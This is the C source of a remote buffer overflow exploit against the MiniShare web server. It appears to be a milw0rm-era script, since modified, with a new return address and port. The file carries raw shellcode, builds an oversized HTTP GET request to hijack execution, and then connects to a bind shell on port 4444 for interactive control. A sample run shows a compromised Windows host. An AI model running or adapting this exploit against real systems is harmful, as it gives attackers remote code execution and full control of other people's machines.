/*
no@0x00:~/Exploits/minishare$ ./mini-exploit 10.20.30.2

***MiniShare remote buffer overflow UNIX exploit by NoPh0BiA.***

[x] Connected to: 10.20.30.2 on port 80.
[x] Sending bad code..done.
[x] Trying to connect to: 10.20.30.2 on port 4444..
[x] 0wn3d!

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

E:\Program Files\MiniShare>

Greetz to NtWaK0,kane,kamalo,foufz, and schap :)
http://NoPh0BiA.lostspirits.org

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <fcntl.h>

//Port 123 found in ../../../../PROGRA~1/minishare/minishare.ini
#define PORT 123
#define PORT1 4444
#define RET "\x53\x93\x3a\x7e"
/*
['Windows XP SP3 French', { 'Rets' => [ 1787, 0x7e3a9353 ]}], # jmp esp
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/minishare_get_overflow.rb
*/
 //351 bytes
char shellcode[]=
"\xbb\x48\x97\x16\xdd\xdb\xca\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x53\x83\xc2\x04\x31\x5a\x0e\x03\x12\x99\xf4\x28\x5e\x4d\x7a"
"\xd2\x9e\x8e\x1b\x5a\x7b\xbf\x1b\x38\x08\x90\xab\x4a\x5c\x1d"
"\x47\x1e\x74\x96\x25\xb7\x7b\x1f\x83\xe1\xb2\xa0\xb8\xd2\xd5"
"\x22\xc3\x06\x35\x1a\x0c\x5b\x34\x5b\x71\x96\x64\x34\xfd\x05"
"\x98\x31\x4b\x96\x13\x09\x5d\x9e\xc0\xda\x5c\x8f\x57\x50\x07"
"\x0f\x56\xb5\x33\x06\x40\xda\x7e\xd0\xfb\x28\xf4\xe3\x2d\x61"
"\xf5\x48\x10\x4d\x04\x90\x55\x6a\xf7\xe7\xaf\x88\x8a\xff\x74"
"\xf2\x50\x75\x6e\x54\x12\x2d\x4a\x64\xf7\xa8\x19\x6a\xbc\xbf"
"\x45\x6f\x43\x13\xfe\x8b\xc8\x92\xd0\x1d\x8a\xb0\xf4\x46\x48"
"\xd8\xad\x22\x3f\xe5\xad\x8c\xe0\x43\xa6\x21\xf4\xf9\xe5\x2d"
"\x39\x30\x15\xae\x55\x43\x66\x9c\xfa\xff\xe0\xac\x73\x26\xf7"
"\xd3\xa9\x9e\x67\x2a\x52\xdf\xae\xe9\x06\x8f\xd8\xd8\x26\x44"
"\x18\xe4\xf2\xf1\x10\x43\xad\xe7\xdd\x33\x1d\xa8\x4d\xdc\x77"
"\x27\xb2\xfc\x77\xed\xdb\x95\x85\x0e\xf2\x39\x03\xe8\x9e\xd1"
"\x45\xa2\x36\x10\xb2\x7b\xa1\x6b\x90\xd3\x45\x23\xf2\xe4\x6a"
"\xb4\xd0\x42\xfc\x3f\x37\x57\x1d\x40\x12\xff\x4a\xd7\xe8\x6e"
"\x39\x49\xec\xba\xa9\xea\x7f\x21\x29\x64\x9c\xfe\x7e\x21\x52"
"\xf7\xea\xdf\xcd\xa1\x08\x22\x8b\x8a\x88\xf9\x68\x14\x11\x8f"
"\xd5\x32\x01\x49\xd5\x7e\x75\x05\x80\x28\x23\xe3\x7a\x9b\x9d"
"\xbd\xd1\x75\x49\x3b\x1a\x46\x0f\x44\x77\x30\xef\xf5\x2e\x05"
"\x10\x39\xa7\x81\x69\x27\x57\x6d\xa0\xe3\x77\x8c\x60\x1e\x10"
"\x09\xe1\xa3\x7d\xaa\xdc\xe0\x7b\x29\xd4\x98\x7f\x31\x9d\x9d"
"\xc4\xf5\x4e\xec\x55\x90\x70\x43\x55\xb1";


struct sockaddr_in hrm;

void shell(int sock)
{
fd_set fd_read;
char buff[1024];
int n;

while(1) {
FD_SET(sock,&fd_read);
FD_SET(0,&fd_read);

if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;

if( FD_ISSET(sock, &fd_read) ) {
n=read(sock,buff,sizeof(buff));
if (n == 0) {
printf ("Connection closed.\n");
exit(EXIT_FAILURE);
} else if (n < 0) {
perror("read remote");
exit(EXIT_FAILURE);
}
write(1,buff,n);
}

if ( FD_ISSET(0, &fd_read) ) {
if((n=read(0,buff,sizeof(buff)))<=0){
perror ("read user");
exit(EXIT_FAILURE);
}
write(sock,buff,n);
}
}
close(sock);
}

int conn(char *ip, int p)
{
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_port = htons(p);
hrm.sin_addr.s_addr = inet_addr(ip);
bzero(&(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr))) < 0 )
{
perror("connect");
exit(0);
}
return sockfd;
}

int main(int argc, char *argv[])
{
if(argc < 2)
{
printf("Usage: TARGET.\n");
exit(0);
}
char *buffer = malloc(2220),*B=malloc(30),*target=argv[1];
int x,y;
printf("\n***MiniShare remote buffer overflow UNIX exploit by NoPh0BiA.***\n\n");
memset(buffer,'\0',2220);
//Changed B to NOPS
memset(B,0x90,12);
memset(buffer,0x41,1787);
strcat(buffer,RET);
strcat(buffer,B);
strcat(buffer,shellcode);
if((x = conn(target,PORT)))
printf("[x] Connected to: %s on port %d.\n",target,PORT);
sleep(3);
printf("[x] Sending bad code..");
write(x,"GET ",4);
write(x,buffer,2220);
write(x," HTTP/1.1\r\n\r\n",13);
sleep(3);
printf("done.\n");
printf("[x] Trying to connect to: %s on port %d..\n",target,PORT1);
if((y=conn(target,PORT1)))
{
printf("[x] 0wn3d!\n\n");
shell(y);
}

}

// milw0rm.com [2004-11-16]
